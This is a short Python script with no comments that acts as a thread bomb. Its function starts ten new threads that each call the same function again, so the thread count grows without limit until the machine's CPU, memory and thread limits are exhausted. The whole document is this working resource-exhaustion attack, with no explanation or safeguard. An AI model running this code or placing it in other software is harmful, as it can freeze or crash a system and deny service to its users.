import threading

def create_thread():
    for x in range(10):
        new_thread = threading.Thread(target=create_thread)
        new_thread.start()

create_thread()
